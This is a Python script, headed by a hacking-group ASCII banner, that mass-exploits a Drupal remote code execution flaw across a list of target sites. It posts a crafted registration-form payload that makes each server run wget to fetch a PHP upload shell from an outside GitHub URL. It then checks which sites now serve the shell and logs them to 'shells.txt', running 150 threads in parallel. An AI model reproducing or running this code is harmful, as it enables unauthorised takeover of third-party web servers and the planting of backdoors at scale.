#!/usr/bin/env
import sys
import requests
from multiprocessing.dummy import Pool
import time
import random





try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    exit('Usar: rce.py list.txt')
def progressbar(it, prefix = "", size = 1000):
    count = len(it)
    def _show(_i):
        x = int(size*_i/count)
        sys.stdout.write("%s[%s%s] %i/%i\r" % (prefix, "#"*x, "_"*(size-x), _i, count))
        sys.stdout.flush()
    _show(0)
    for i, item in enumerate(it):
        yield item
        _show(i+1)
    sys.stdout.write("\n")
    sys.stdout.flush()
toolbar_width = 30

sys.stdout.write(":%s:" % (" " * toolbar_width))
sys.stdout.flush()
sys.stdout.write("\b" * (toolbar_width+1))

for i in xrange(toolbar_width):
    time.sleep(0.01)

    sys.stdout.write("*")
    sys.stdout.flush()

sys.stdout.write("\n")
def print_logo():
    clear = "\x1b[0m"
    colors = [31, 32, 33, 34, 35, 36]

    logo = """                                                                                                                    

 /$$      /$$ /$$                    /$$$$$$$                                        
| $$$    /$$$|__/                   | $$__  $$                                       
| $$$$  /$$$$ /$$  /$$$$$$$ /$$$$$$$| $$  \ $$ /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$
| $$ $$/$$ $$| $$ /$$_____//$$_____/| $$$$$$$//$$__  $$ /$$__  $$|  $$ /$$/| $$  | $$
| $$  $$$| $$| $$|  $$$$$$|  $$$$$$ | $$____/| $$  \__/| $$  \ $$ \  $$$$/ | $$  | $$
| $$\  $ | $$| $$ \____  $$\____  $$| $$     | $$      | $$  | $$  >$$  $$ | $$  | $$
| $$ \/  | $$| $$ /$$$$$$$//$$$$$$$/| $$     | $$      |  $$$$$$/ /$$/\  $$|  $$$$$$$
|__/     |__/|__/|_______/|_______/ |__/     |__/       \______/ |__/  \__/ \____  $$
                                                                            /$$  | $$
                                                                           |  $$$$$$/
                                                                            \______/ 

  ____                                                              _____           _                     _______                            
 |  _ \                                                             / ____|         | |                   |__   __|                           
 | |_) |   __ _   _ __    _   _   _   _   _ __ ___     __ _   ___  | |       _   _  | |__     ___   _ __     | |      ___    __ _   _ __ ___  
 |  _ <   / _` | | '_ \  | | | | | | | | | '_ ` _ \   / _` | / __| | |      | | | | | '_ \   / _ \ | '__|    | |     / _ \  / _` | | '_ ` _ \ 
 | |_) | | (_| | | | | | | |_| | | |_| | | | | | | | | (_| | \__ \ | |____  | |_| | | |_) | |  __/ | |       | |    |  __/ | (_| | | | | | | |
 |____/   \__,_| |_| |_|  \__, |  \__,_| |_| |_| |_|  \__,_| |___/  \_____|  \__, | |_.__/   \___| |_|       |_|     \___|  \__,_| |_| |_| |_|
                           __/ |                                              __/ |                                                           
                          |___/                                              |___/                                                            

""" 
    for line in logo.split("\n"):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)
print_logo()

payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/dr-iman/SpiderProject/master/lib/exploits/web-app/wordpress/ads-manager/payload.php'}
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'}

def run(u):
    try:
        url = u + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
        r = requests.post(url, data=payload, verify=False, headers=headers)
        if 'Select Your File :' in requests.get(u+'/payload.php', verify=False, headers=headers).text:
            print (u, '==> RCE')
            with open('shells.txt', mode='a') as d:
                 d.write(u + '/payload.php\n')
        else:
            print(u, "==> Not Vuln")
    except:
        pass

mp = Pool(150)
mp.map(run, target)
mp.close()
mp.join()
